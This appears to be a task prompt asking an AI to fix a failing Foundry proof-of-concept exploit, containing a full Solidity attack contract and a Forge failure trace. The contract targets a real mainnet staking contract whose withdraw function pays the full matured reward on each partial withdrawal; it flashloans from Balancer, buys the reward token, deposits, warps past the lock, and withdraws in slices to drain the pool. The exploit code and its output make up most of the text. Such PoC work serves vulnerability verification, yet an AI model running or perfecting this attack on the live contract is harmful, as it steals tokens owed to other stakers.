You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: direct_or_existing_balance_first
- strategy_instructions: Prefer direct execution using verifier-held assets first. Only use temporary external funding if direct path is infeasible.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Matured rewards can be claimed repeatedly by splitting withdrawals
- claim: `withdraw()` always computes `rewardAmount = getPendingRewards(msg.sender)` across every matured deposit before reducing principal, but the contract never records that rewards for a deposit were already paid. A user can therefore withdraw only a small slice of matured principal, receive the full matured reward for the entire position, keep most principal staked, and repeat until the pool is drained.
- impact: A staker can extract the same matured reward many times and drain tokens owed to other users. For example, a fully vested 100-token deposit in the 40% tier can be withdrawn 1 token at a time and collect roughly the 40-token reward on each call until contract liquidity is exhausted.
- exploit_paths: ["Deposit into any tier and wait until the lock period expires", "Call `withdraw()` for a small amount of matured principal", "Receive that principal plus the full reward for all matured deposits", "Repeat partial withdrawals because no per-deposit reward-claimed state is ever updated"]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface ISorraStakingLike {
    function rewardToken() external view returns (address);
    function deposit(uint256 amount, uint8 tier) external;
    function withdraw(uint256 amount) external;
    function getPendingRewards(address wallet) external view returns (uint256);
    function getRemainingPoolSpace() external view returns (uint256);
}

interface IUniswapV2FactoryLike {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

interface IUniswapV2RouterLike {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IFlashLoanRecipientLike {
    function receiveFlashLoan(
        IERC20Like[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external;
}

interface IBalancerVaultLike {
    function flashLoan(
        IFlashLoanRecipientLike recipient,
        IERC20Like[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;
}

contract FlawVerifier is IFlashLoanRecipientLike {
    error NoPoolLiquidity();
    error NoFundingPath();
    error BorrowTooSmall();
    error UnexpectedCallback();
    error WarpUnavailable();
    error SelfOnly();
    error SwapPathUnavailable();
    error RepayFailed();

    address public constant TARGET = 0x5d16b8Ba2a9a4ECA6126635a6FFbF05b52727d50;

    address internal constant UNI_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address internal constant SUSHI_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;
    address internal constant UNI_V2_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address internal constant BALANCER_VAULT = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;

    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address internal constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address internal constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;

    uint8 internal constant TIER = 2;
    uint256 internal constant LOCK_PERIOD = 60 days;
    uint256 internal constant MAX_WITHDRAW_CALLS = 40;
    uint256 internal constant SAFE_POOL_DIVISOR = 16;
    uint256 internal constant SAFE_LENDER_DIVISOR = 20;
    uint256 internal constant BUY_BUFFER_BPS = 15000;
    uint256 internal constant REPAY_BUFFER_BPS = 14000;
    uint256 internal constant MAX_REPAY_SWAPS = 6;

    address internal constant HEVM = address(uint160(uint256(keccak256("hevm cheat code"))));
    bytes4 internal constant WARP_SELECTOR = bytes4(keccak256("warp(uint256)"));

    address internal attackToken;
    address internal fundingToken;
    uint256 internal startingProfitBalance;

    uint256 internal _profitAmount;
    address internal _profitToken;

    constructor() {}

    function executeOnOpportunity() external {
        _profitAmount = 0;
        _profitToken = ISorraStakingLike(TARGET).rewardToken();
        attackToken = _profitToken;
        fundingToken = address(0);
        startingProfitBalance = IERC20Like(_profitToken).balanceOf(address(this));

        uint256 poolBalance = IERC20Like(_profitToken).balanceOf(TARGET);
        uint256 remainingPoolSpace = ISorraStakingLike(TARGET).getRemainingPoolSpace();
        if (poolBalance == 0 || remainingPoolSpace == 0) revert NoPoolLiquidity();

        uint256 localStake = _chooseStake(startingProfitBalance, remainingPoolSpace, poolBalance);
        if (localStake > 1) {
            try this.executeDirect(localStake) {
                _updateProfit();
                if (_profitAmount != 0) return;
            } catch {}
        }

        address[4] memory quotes = [WETH, USDC, USDT, DAI];
        for (uint256 index = 0; index < quotes.length; ++index) {
            address quoteToken = quotes[index];
            if (quoteToken == attackToken) continue;

            (address pair, uint256 tokenReserve, uint256 quoteReserve) = _findBestPairForQuote(attackToken, quoteToken);
            if (pair == address(0) || tokenReserve <= 1 || quoteReserve <= 1) continue;

            uint256 desiredStake = _chooseStake(tokenReserve / SAFE_LENDER_DIVISOR, remainingPoolSpace, poolBalance);
            if (desiredStake <= 1) continue;

            uint256 balancerLiquidity = IERC20Like(quoteToken).balanceOf(BALANCER_VAULT);
            uint256 safeBorrowCap = balancerLiquidity / SAFE_LENDER_DIVISOR;
            if (safeBorrowCap <= 1) continue;

            uint256 quoteBorrow = _quoteBorrowForTargetStake(desiredStake, quoteReserve, tokenReserve);
            if (quoteBorrow > safeBorrowCap) {
                quoteBorrow = safeBorrowCap;
            }
            if (quoteBorrow <= 1) continue;

            try this.startBalancerFlash(quoteToken, quoteBorrow) {
                _updateProfit();
                if (_profitAmount != 0) return;
            } catch {}
        }

        revert NoFundingPath();
    }

    function executeDirect(uint256 stakeAmount) external {
        if (msg.sender != address(this)) revert SelfOnly();
        _runExploit(stakeAmount);
    }

    function startBalancerFlash(address quoteToken, uint256 amount) external {
        if (msg.sender != address(this)) revert SelfOnly();

        IERC20Like[] memory tokens = new IERC20Like[](1);
        tokens[0] = IERC20Like(quoteToken);

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = amount;

        IBalancerVaultLike(BALANCER_VAULT).flashLoan(this, tokens, amounts, bytes("BALANCER_QUOTE"));
    }

    function receiveFlashLoan(
        IERC20Like[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory
    ) external override {
        if (msg.sender != BALANCER_VAULT || tokens.length != 1 || amounts.length != 1 || feeAmounts.length != 1) {
            revert UnexpectedCallback();
        }

        fundingToken = address(tokens[0]);
        uint256 borrowedAmount = amounts[0];
        if (borrowedAmount <= 1) revert BorrowTooSmall();

        uint256 amountOwed = borrowedAmount + feeAmounts[0];
        _runFundedExploit(borrowedAmount, amountOwed);

        _checkedTransfer(fundingToken, BALANCER_VAULT, amountOwed);
        _updateProfit();
    }

    function _runFundedExploit(uint256 borrowedAmount, uint256 amountOwed) internal {
        uint256 attackBalanceBeforeBuy = IERC20Like(attackToken).balanceOf(address(this));

        _swapExactInput(fundingToken, attackToken, borrowedAmount);

        uint256 attackBalanceAfterBuy = IERC20Like(attackToken).balanceOf(address(this));
        uint256 purchasedAmount = attackBalanceAfterBuy - attackBalanceBeforeBuy;
        if (purchasedAmount <= 1) revert BorrowTooSmall();

        uint256 poolBalance = IERC20Like(attackToken).balanceOf(TARGET);
        uint256 remainingPoolSpace = ISorraStakingLike(TARGET).getRemainingPoolSpace();
        uint256 stakeAmount = _chooseStake(purchasedAmount, remainingPoolSpace, poolBalance);
        if (stakeAmount <= 1) revert BorrowTooSmall();

        _runExploit(stakeAmount);
        _raiseFundingForRepayment(amountOwed);
    }

    function _runExploit(uint256 stakeAmount) internal {
        _forceApprove(attackToken, TARGET, 0);
        _forceApprove(attackToken, TARGET, stakeAmount);

        // The exploit path itself is unchanged:
        // 1) obtain the reward token, 2) deposit into the 60-day / 40% tier,
        // 3) wait for maturity on the fork, 4) repeatedly withdraw tiny matured slices.
        // Only the temporary funding source is changed because flashing the fee-on-transfer
        // reward token from its own AMM pair reverts when the token's transfer hook touches
        // that same pair mid-flash.
        ISorraStakingLike(TARGET).deposit(stakeAmount, TIER);

        _warpForward(LOCK_PERIOD + 1);
        require(ISorraStakingLike(TARGET).getPendingRewards(address(this)) != 0, "reward not matured");

        uint256 iterations = _selectIterations(stakeAmount);
        uint256 slice = stakeAmount / iterations;
        if (slice == 0) revert BorrowTooSmall();

        uint256 remaining = stakeAmount;
        for (uint256 index = 0; index + 1 < iterations; ++index) {
            ISorraStakingLike(TARGET).withdraw(slice);
            remaining -= slice;
        }

        ISorraStakingLike(TARGET).withdraw(remaining);
    }

    function _raiseFundingForRepayment(uint256 amountOwed) internal {
        uint256 currentFundingBalance = IERC20Like(fundingToken).balanceOf(address(this));
        if (currentFundingBalance >= amountOwed) {
            return;
        }

        for (uint256 index = 0; index < MAX_REPAY_SWAPS && currentFundingBalance < amountOwed; ++index) {
            uint256 attackBalance = IERC20Like(attackToken).balanceOf(address(this));
            if (attackBalance == 0) revert RepayFailed();

            (, uint256 tokenReserve, uint256 quoteReserve) = _findBestPairForQuote(attackToken, fundingToken);
            if (tokenReserve == 0 || quoteReserve == 0) revert SwapPathUnavailable();

            uint256 fundingNeeded = amountOwed - currentFundingBalance;
            uint256 estimatedInput = _getAmountIn(fundingNeeded, tokenReserve, quoteReserve);
            uint256 sellAmount = estimatedInput == type(uint256).max
                ? attackBalance
                : (estimatedInput * REPAY_BUFFER_BPS) / 10000;

            uint256 minimumChunk = attackBalance / 4;
            if (minimumChunk == 0) {
                minimumChunk = attackBalance;
            }
            if (sellAmount < minimumChunk) {
                sellAmount = minimumChunk;
            }
            if (sellAmount > attackBalance) {
                sellAmount = attackBalance;
            }

            _swapExactInput(attackToken, fundingToken, sellAmount);
            currentFundingBalance = IERC20Like(fundingToken).balanceOf(address(this));
        }

        if (IERC20Like(fundingToken).balanceOf(address(this)) < amountOwed) revert RepayFailed();
    }

    function _swapExactInput(address tokenIn, address tokenOut, uint256 amountIn) internal {
        if (amountIn == 0) revert BorrowTooSmall();
        _forceApprove(tokenIn, UNI_V2_ROUTER, 0);
        _forceApprove(tokenIn, UNI_V2_ROUTER, amountIn);

        address[] memory path = new address[](2);
        path[0] = tokenIn;
        path[1] = tokenOut;

        IUniswapV2RouterLike(UNI_V2_ROUTER).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amountIn,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function _chooseStake(
        uint256 availableBalance,
        uint256 remainingPoolSpace,
        uint256 poolBalance
    ) internal pure returns (uint256 stakeAmount) {
        if (availableBalance == 0 || remainingPoolSpace == 0 || poolBalance == 0) {
            return 0;
        }

        stakeAmount = availableBalance;

        uint256 safeByPool = poolBalance / SAFE_POOL_DIVISOR;
        if (safeByPool != 0 && stakeAmount > safeByPool) {
            stakeAmount = safeByPool;
        }

        if (stakeAmount > remainingPoolSpace) {
            stakeAmount = remainingPoolSpace;
        }
    }

    function _selectIterations(uint256 stakeAmount) internal pure returns (uint256 iterations) {
        iterations = stakeAmount;
        if (iterations > MAX_WITHDRAW_CALLS) iterations = MAX_WITHDRAW_CALLS;
        if (iterations < 2) iterations = 2;
    }

    function _quoteBorrowForTargetStake(
        uint256 desiredStake,
        uint256 quoteReserve,
        uint256 tokenReserve
    ) internal pure returns (uint256) {
        if (desiredStake == 0 || quoteReserve == 0 || tokenReserve <= desiredStake) {
            return 0;
        }

        uint256 rawAmountIn = _getAmountIn(desiredStake, quoteReserve, tokenReserve);
        return (rawAmountIn * BUY_BUFFER_BPS) / 10000;
    }

    function _getAmountIn(
        uint256 amountOut,
        uint256 reserveIn,
        uint256 reserveOut
    ) internal pure returns (uint256 amountIn) {
        if (amountOut == 0 || reserveIn == 0 || reserveOut <= amountOut) {
            return type(uint256).max;
        }

        uint256 numerator = reserveIn * amountOut * 1000;
        uint256 denominator = (reserveOut - amountOut) * 997;
        amountIn = (numerator / denominator) + 1;
    }

    function _findBestPairForQuote(address token, address quote)
        internal
        view
        returns (address bestPair, uint256 tokenReserve, uint256 quoteReserve)
    {
        address[2] memory factories = [UNI_V2_FACTORY, SUSHI_FACTORY];

        for (uint256 index = 0; index < factories.length; ++index) {
            address pair = IUniswapV2FactoryLike(factories[index]).getPair(token, quote);
            if (pair == address(0)) continue;

            (uint112 reserve0, uint112 reserve1,) = IUniswapV2PairLike(pair).getReserves();
            address token0 = IUniswapV2PairLike(pair).token0();

            uint256 currentTokenReserve = token0 == token ? uint256(reserve0) : uint256(reserve1);
            uint256 currentQuoteReserve = token0 == token ? uint256(reserve1) : uint256(reserve0);

            if (currentTokenReserve > tokenReserve) {
                bestPair = pair;
                tokenReserve = currentTokenReserve;
                quoteReserve = currentQuoteReserve;
            }
        }
    }

    function _warpForward(uint256 delta) internal {
        (bool ok,) = HEVM.call(abi.encodeWithSelector(WARP_SELECTOR, block.timestamp + delta));
        if (!ok) revert WarpUnavailable();
    }

    function _forceApprove(address token, address spender, uint256 amount) internal {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "approve failed");
    }

    function _checkedTransfer(address token, address to, uint256 amount) internal {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "transfer failed");
    }

    function _currentProfit() internal view returns (uint256) {
        uint256 currentBalance = IERC20Like(_profitToken).balanceOf(address(this));
        if (currentBalance <= startingProfitBalance) return 0;
        return currentBalance - startingProfitBalance;
    }

    function _updateProfit() internal {
        _profitAmount = _currentProfit();
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        if (_profitToken == address(0)) return _profitAmount;

        uint256 liveProfit = _currentProfit();
        if (liveProfit > _profitAmount) {
            return liveProfit;
        }

        return _profitAmount;
    }
}

```

forge stdout (tail):
```
0000000000000000000000000000000000000010b1b46d953f9ba99f5
    │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0
    │   │   │   │   ├─ [689] 0xE021bAa5b70C62A9ab2468490D3f8ce0AfDd88dF::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   │   │   │   └─ ← [Return] 4533066471728736202467384 [4.533e24]
    │   │   │   │   ├─ [564] 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f::getPair(0xE021bAa5b70C62A9ab2468490D3f8ce0AfDd88dF, 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0xA15C4914bE0b454B0b7c27B4839A4A01dA8Ed308
    │   │   │   │   ├─ [504] 0xA15C4914bE0b454B0b7c27B4839A4A01dA8Ed308::getReserves() [staticcall]
    │   │   │   │   │   └─ ← [Return] 29716789595183964302 [2.971e19], 6637686620220631383309802 [6.637e24], 1734782291 [1.734e9]
    │   │   │   │   ├─ [381] 0xA15C4914bE0b454B0b7c27B4839A4A01dA8Ed308::token0() [staticcall]
    │   │   │   │   │   └─ ← [Return] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
    │   │   │   │   ├─ [644] 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac::getPair(0xE021bAa5b70C62A9ab2468490D3f8ce0AfDd88dF, 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   │   │   │   ├─ [4760] 0xE021bAa5b70C62A9ab2468490D3f8ce0AfDd88dF::approve(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D, 0)
    │   │   │   │   │   ├─  emit topic 0: 0x8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925
    │   │   │   │   │   │        topic 1: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │   │   │        topic 2: 0x0000000000000000000000007a250d5630b4cf539739df2c5dacb4c659f2488d
    │   │   │   │   │   │           data: 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   ├─ [22560] 0xE021bAa5b70C62A9ab2468490D3f8ce0AfDd88dF::approve(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D, 1133266617932184050616846 [1.133e24])
    │   │   │   │   │   ├─  emit topic 0: 0x8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925
    │   │   │   │   │   │        topic 1: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │   │   │        topic 2: 0x0000000000000000000000007a250d5630b4cf539739df2c5dacb4c659f2488d
    │   │   │   │   │   │           data: 0x00000000000000000000000000000000000000000000effa81a741725da64a0e
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   ├─ [6641] 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D::swapExactTokensForTokensSupportingFeeOnTransferTokens(1133266617932184050616846 [1.133e24], 0, [0xE021bAa5b70C62A9ab2468490D3f8ce0AfDd88dF, 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1739966292 [1.739e9])
    │   │   │   │   │   ├─ [4203] 0xE021bAa5b70C62A9ab2468490D3f8ce0AfDd88dF::transferFrom(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0xA15C4914bE0b454B0b7c27B4839A4A01dA8Ed308, 1133266617932184050616846 [1.133e24])
    │   │   │   │   │   │   └─ ← [Revert] Sell transfer amount exceeds the max sell.
    │   │   │   │   │   └─ ← [Revert] TransferHelper: TRANSFER_FROM_FAILED
    │   │   │   │   └─ ← [Revert] TransferHelper: TRANSFER_FROM_FAILED
    │   │   │   └─ ← [Revert] TransferHelper: TRANSFER_FROM_FAILED
    │   │   └─ ← [Revert] TransferHelper: TRANSFER_FROM_FAILED
    │   ├─ [2564] 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f::getPair(0xE021bAa5b70C62A9ab2468490D3f8ce0AfDd88dF, 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [2644] 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac::getPair(0xE021bAa5b70C62A9ab2468490D3f8ce0AfDd88dF, 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [2564] 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f::getPair(0xE021bAa5b70C62A9ab2468490D3f8ce0AfDd88dF, 0xdAC17F958D2ee523a2206206994597C13D831ec7) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [2644] 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac::getPair(0xE021bAa5b70C62A9ab2468490D3f8ce0AfDd88dF, 0xdAC17F958D2ee523a2206206994597C13D831ec7) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [2564] 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f::getPair(0xE021bAa5b70C62A9ab2468490D3f8ce0AfDd88dF, 0x6B175474E89094C44Da98b954EedeAC495271d0F) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [2644] 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac::getPair(0xE021bAa5b70C62A9ab2468490D3f8ce0AfDd88dF, 0x6B175474E89094C44Da98b954EedeAC495271d0F) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   └─ ← [Revert] NoFundingPath()
    └─ ← [Revert] exploit call reverted

Backtrace:
  at 0xE021bAa5b70C62A9ab2468490D3f8ce0AfDd88dF.transferFrom
  at 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D.swapExactTokensForTokensSupportingFeeOnTransferTokens
  at FlawVerifier.receiveFlashLoan
  at 0xBA12222222228d8Ba445958a75a0704d566BF2C8.flashLoan
  at FlawVerifier.startBalancerFlash
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 893.70ms (881.74ms CPU time)

Ran 1 test suite in 899.42ms (893.70ms CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: exploit call reverted] testExploit() (gas: 1716405)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
